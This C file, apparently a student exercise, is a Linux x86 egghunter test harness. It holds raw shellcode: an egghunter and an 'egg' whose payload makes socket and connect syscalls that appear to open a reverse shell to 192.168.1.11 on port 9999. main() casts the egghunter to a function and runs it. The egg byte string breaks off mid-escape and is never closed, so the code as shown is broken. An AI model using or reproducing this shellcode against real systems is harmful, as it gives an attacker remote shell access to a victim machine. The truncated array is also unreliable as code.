/*
Tool:           Linux x86 Egghunter
Author:         Mohit Suyal (@mosunit)
Student ID:     PA-16521
Blog:           https://mosunit.com
*/


#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
"\x31\xd2\x66\x83\xca\xff\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xef\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char egg[] = \
"\x90\x50\x90\x50"
"\x90\x50\x90\x50"
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x89\xc2\xb0\x66\xb3\x03\x31\xc9\x68\xc0\xa8\x01\x0b\x66\x68\x27\x0f\x66\x6a\x02\x89\xe6\x6a\x10\x56\x5>

main()

{
        printf("Egghunter length: %d\n", strlen(egghunter));
        int (*ret)() = (int(*)())egghunter;
        ret();
}
